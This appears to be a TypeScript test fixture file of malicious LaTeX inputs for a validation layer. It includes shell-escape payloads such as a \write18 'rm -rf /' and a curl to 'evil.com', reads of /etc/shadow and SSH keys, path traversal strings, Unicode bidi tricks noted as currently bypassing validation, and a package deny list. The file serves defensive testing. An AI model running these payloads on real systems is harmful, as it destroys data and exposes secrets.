/**
 * Malicious LaTeX inputs for security testing
 *
 * These inputs should all be REJECTED by the validation layer.
 * Tests for these fixtures are in __tests__/unit/validation/
 *
 * Note: Shell metacharacters are NOT tested here as they're handled
 * by the secure-exec layer, not the validation layer.
 */

// Dangerous LaTeX commands that can execute arbitrary code or access files
export const dangerousCommands = [
  // File write/shell commands
  { latex: '\\write18{rm -rf /}', description: 'Shell escape command' },
  { latex: '\\immediate\\write18{curl evil.com}', description: 'Immediate shell escape' },
  { latex: '\\system{malicious}', description: 'System command' },
  { latex: '\\ShellEscape{evil}', description: 'Shell escape alternative' },

  // File system access
  { latex: '\\input{/etc/passwd}', description: 'File inclusion attack' },
  { latex: '\\include{secrets}', description: 'File include command' },
  { latex: '\\InputIfFileExists{/etc/shadow}{}{}}', description: 'Conditional file read' },
  { latex: '\\openout\\file=output.txt', description: 'Open file for writing' },
  { latex: '\\closeout\\file', description: 'Close file handle' },
  { latex: '\\read\\file to\\data', description: 'Read file command' },
  { latex: '\\openin\\file=input.txt', description: 'Open file for reading' },

  // Code execution and macro manipulation
  { latex: '\\def\\malicious{code}', description: 'Define macro' },
  { latex: '\\gdef\\global{code}', description: 'Global macro definition' },
  { latex: '\\edef\\expanded{code}', description: 'Expanded definition' },
  { latex: '\\xdef\\xexpanded{code}', description: 'Expanded global definition' },
  { latex: '\\let\\a=\\b', description: 'Let assignment' },
  { latex: '\\futurelet\\token\\next', description: 'Future let command' },
  { latex: '\\expandafter\\next', description: 'Expand after command' },

  // Token manipulation
  { latex: '\\csname endcsname', description: 'Control sequence name' },
  { latex: '\\endcsname', description: 'End control sequence name' },
  { latex: '\\string\\command', description: 'String command' },
  { latex: '\\meaning\\token', description: 'Meaning command' },
  { latex: '\\jobname', description: 'Job name access' },
  { latex: '\\detokenize{text}', description: 'Detokenize command' },
  { latex: '\\scantokens{text}', description: 'Scan tokens command' },

  // Category code manipulation
  { latex: '\\catcode`\\@=11', description: 'Category code change' },
  { latex: '\\catcode0=15', description: 'Category code numeric' },

  // Case variations (should still be blocked)
  { latex: '\\WRITE18{evil}', description: 'Uppercase write18' },
  { latex: '\\Write18{evil}', description: 'Mixed case write18' },
  { latex: '\\INPUT{file}', description: 'Uppercase input' },
  { latex: '\\INCLUDE{file}', description: 'Uppercase include' },

  // Commands in context
  { latex: '$x = 1$ \\write18{evil}', description: 'Command after valid equation' },
  { latex: '\\write18{evil} $x = 1$', description: 'Command before valid equation' },
  { latex: '\\frac{\\write18{evil}}{2}', description: 'Command within fraction' },
]

// Path traversal attempts
// Note: PATH_TRAVERSAL_REGEX = /\.\.|\/\.\.|~|\/etc\/|\/proc\/|\/sys\/|\/dev\/|\/tmp\/|\\string|\\detokenize/i
export const pathTraversalInputs = [
  { latex: '..', description: 'Parent directory reference' },
  { latex: '/../etc/passwd', description: 'Absolute path traversal' },
  { latex: '~/.ssh/id_rsa', description: 'Home directory access' },
  { latex: '/etc/passwd', description: 'Absolute path to /etc' },
  { latex: '/proc/self/environ', description: 'Process environment access' },
  { latex: '/sys/class/net', description: 'System directory access' },
  { latex: '/dev/null', description: 'Device access' },
  { latex: '/tmp/malicious', description: 'Temp directory access' },
  { latex: '\\string{../secrets}', description: 'String with path traversal' },
  { latex: '\\detokenize{../../etc}', description: 'Detokenize with path traversal' },
  { latex: '\\includegraphics{../../../secret.png}', description: 'Graphics with path traversal' },
  { latex: '$x = 1$ .. $y = 2$', description: 'Path traversal in equation' },
]

// Unicode and encoding attacks
// Note: These attacks currently BYPASS validation (tests document real vulnerabilities).
// The regex-based validation only matches ASCII command names, so Unicode obfuscation
// (zero-width chars, homoglyphs, combining diacritics) can evade detection.
// However, LaTeX compiler will also likely reject these malformed commands,
// providing defense-in-depth. Future enhancement could add Unicode normalization.
export const unicodeAttacks = [
  // Bidirectional text attacks (RLO can reorder display of commands)
  { latex: '\\write18{safe}\u202e}18etirw\\', description: 'RLO to hide write18 command' },
  { latex: '\u202E\\input{file}', description: 'RLO override before input command' },
]

// Unauthorized packages
export const unauthorizedPackages = [
  { latex: '\\usepackage{verbatim}', description: 'Verbatim package' },
  { latex: '\\usepackage{listings}', description: 'Listings package' },
  { latex: '\\usepackage{shellesc}', description: 'Shell escape package' },
  { latex: '\\usepackage{tikz}', description: 'TikZ package (complex graphics)' },
  { latex: '\\usepackage{pgf}', description: 'PGF package' },
  { latex: '\\usepackage{luacode}', description: 'Lua code package' },
  { latex: '\\usepackage{pythontex}', description: 'Python TeX package' },
  { latex: '\\usepackage{minted}', description: 'Minted code package' },
  { latex: '\\usepackage[options]{unauthorized}', description: 'Unknown package with options' },
  { latex: '\\usepackage{amsmath}\\usepackage{evil}', description: 'Mixed authorized and unauthorized' },
]
